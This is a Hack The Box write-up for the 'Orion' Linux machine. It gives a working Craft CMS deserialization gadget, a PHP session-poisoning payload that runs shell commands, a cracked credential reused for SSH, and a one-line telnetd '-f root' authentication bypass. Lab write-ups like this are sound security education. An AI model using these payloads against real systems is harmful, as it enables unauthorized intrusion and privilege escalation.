# Orion — Hack The Box, Linux

**TL;DR:** Two ports and a static-looking site, but the 404 page leaks
`X-Powered-By: Craft CMS` and the control panel answers unauthenticated. Craft is
vulnerable to CVE-2025-32432, an unauthenticated deserialization that reaches
`require($itemFile)` through a Yii `PhpManager` gadget — a *blind* file-include
RCE. Poisoning a PHP session file with a literal `<?= ?>` tag (over a raw socket,
because any HTTP client URL-encodes it) turns that include into code execution as
`www-data`. Craft's `.env` and `users` table give a bcrypt hash that cracks and is
reused for SSH. Root is a custom **GNU inetutils telnetd 2.7** running as root on
localhost: CVE-2026-24061 lets a client-supplied `USER` value land unsanitised in
the `login` argv, so `-f root` skips authentication entirely.

## 1. Recon

```
22/tcp  OpenSSH 8.9p1 Ubuntu
80/tcp  nginx 1.18.0
```

Full TCP and UDP top-100 confirm there is nothing else. `/` 302-redirects to
`http://orion.htb/`, a static "Orion Telecom" brochure page; vhost fuzzing against
`subdomains-top5000` finds no additional names. With a surface this small the web
app is the only path, so the question is what is actually serving it.

The 404 page answers it:

```
X-Powered-By: Craft CMS
```

and `/admin/login` serves the Craft control panel to an unauthenticated client.

## 2. Foothold — CVE-2025-32432 (Craft CMS RCE)

Craft's `actions/assets/generate-transform` passes a client-supplied `handle`
into Yii's `Craft::createObject()`, which means the request body chooses which
class gets instantiated and with which constructor arguments. The gadget:

```json
{"assetId":1,"handle":{"width":1,"height":1,"as x":{
  "class":"craft\\behaviors\\FieldLayoutBehavior",
  "__class":"yii\\rbac\\PhpManager",
  "__construct()":[{"itemFile":"<path>"}]}}}
```

`PhpManager::init()` calls `loadFromFile()`, which calls **`require($itemFile)`** —
an arbitrary file include, executed as PHP. Two details cost real time:

- **`class` alone does not work.** `PhpManager` is not a Yii `Behavior`, so an
  `as x` key naming it directly fails to attach and the gadget silently does
  nothing. `class` must be a *real* behavior (`FieldLayoutBehavior`) and `__class`
  then overrides the type that is actually instantiated.
- **The include is blind.** Craft buffers and discards the output; the verbose
  error page that comes back is Craft dumping `$_SESSION`, not your code's output.
  Every test has to be a **side effect** — timing, an outbound callback, a file
  write — never a reflected string.

The include needs a file on disk containing attacker-controlled PHP. The classic
target is a **PHP session file**: owned by `www-data`, readable by php-fpm, and
Craft helpfully writes the post-login return URL into it. So:

```
GET /index.php?p=admin/dashboard&a=<?=system($_GET['_'])?>
```

stores the payload as `__returnUrl` inside
`/var/lib/php/sessions/sess_<CraftSessionId>`. The one thing that must be right:
send this over a **raw socket**. `requests` and `curl` encode `<` and `>` to
`%3C`/`%3E`, and `%3C?php` stored in the session is never a PHP tag — the include
runs and does nothing, which is indistinguishable from the gadget failing.

With a literal tag stored, point `itemFile` at the session file. `<?=sleep(6)?>`
returns in 6.2 s — the oracle. Swap in a socat reverse shell (egress on 80/443 is
open) and the box answers as `uid=33(www-data)`.

## 3. User — Craft credentials → SSH

```
$ cat /var/www/html/craft/.env
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_SECURITY_KEY=...
```

The Craft `users` table has one account:

```
admin | adam@orion.htb | $2y$13$e9zuohgF…   (bcrypt)
```

`john` with rockyou cracks it to **`darkangel`**, and it is reused verbatim on the
system account:

```
$ ssh adam@orion.htb
adam@orion:~$ cat user.txt
<user flag redacted>
```

## 4. Root — CVE-2026-24061 (telnetd argument injection)

`adam` has no sudo rights, nothing interesting in SUID/capabilities/cron. The
anomaly is in `inetd.conf`: a **custom GNU inetutils telnetd 2.7 running as root**
on `127.0.0.1:23`, built out of `/home/jonathan/inetutils-2.7` — a service nobody
installs by accident in 2026.

telnetd builds the command line for `login` from a template string:

```c
login -p -h %h %?u{-f %u}{%U}
```

`%u` is the authenticated user, `%U` is the `USER` value the *client* sends over
the NEW_ENVIRON option. When there is no authenticated user, the template falls
through to `%U` and substitutes the client's string into the argv **without
sanitisation or quoting**. Setting `USER` to `-f root` produces:

```
login -p -h orion -f root
```

and `login -f` means "this user is already authenticated, skip it".

```
adam@orion:~$ telnet -l "-f root" 127.0.0.1 23
root@orion:~# cat /root/root.txt
<root flag redacted>
```

No exploit code, no memory corruption — a format template that trusts a
pre-authentication environment variable.

## What did not work

- **CVE-2023-41892** (Craft `conditions/render` RCE) returns 400 — wrong branch,
  and a useful negative that pins the version range before committing to 32432.
- **access.log poisoning**, the usual partner for a `require`-based include, is
  dead here: the nginx log is `root:adm` and `www-data` cannot read it. The
  session-file variant exists precisely because of that.
- **Writable unit files.** `/etc/systemd/system/sudo.service` and
  `systemd-networkd.service` are writable by `adam`, which looks like an instant
  win — they are masked symlinks to `/dev/null`, so writing them achieves nothing,
  and `adam` cannot restart units anyway (polkit demands a root password). The
  root `phpsessionclean` timer only `-delete`s `sess_*` files, with no injection
  point.
- **CVE-2026-32746**, the SLC LINEMODE overflow in the *same* telnetd binary, is
  the trap. It is real and it triggers on-target, and the SLC response even leaks
  a BSS pointer that defeats PIE. But reversing `add_slc()` shows the write is
  **linear-forward** — `slcptr` is loaded once and stored back as `prev + 3` on
  each call, so it can only march forward through BSS, three sparse bytes at a
  time. `login_invocation`, the obvious target, lives at a *lower* address in
  `.data` and is unreachable. Public research on this CVE stops at an
  arbitrary-`free()` on 32-bit with no 64-bit RCE, which is exactly what the
  binary allows. Days of exploit-dev sit behind that door; the auth bypass in the
  same daemon is a one-liner.

## Takeaways

- **A blind RCE is still an RCE.** The moment output is not reflected, switch the
  oracle rather than the exploit: `sleep()` for timing, a DNS/HTTP callback, or a
  file write you can read back another way. Chasing a reflected string here would
  have looked like the gadget was broken when it was already executing.
- **URL-encoding is the enemy of tag injection.** If a `<?php`/`<?=` must land raw
  in a stored value, drop below the HTTP client and write the request on a socket.
  This is a general rule for log poisoning and session poisoning alike.
- **When a deserialization gadget "silently fails", check the type hierarchy, not
  the payload syntax.** Yii's `as x` requires an actual `Behavior` in `class`;
  `__class` is what redirects the instantiation. The distinction is invisible in
  the response.
- **Two CVEs in one binary are not interchangeable.** Before committing to a
  memory-corruption path, read the actual code and ask what the primitive really
  is — a linear-forward write is not an arbitrary write. And search for a
  weaponised public exploit before writing one; the cheapest bug in the daemon was
  an argument injection sitting in a format string.
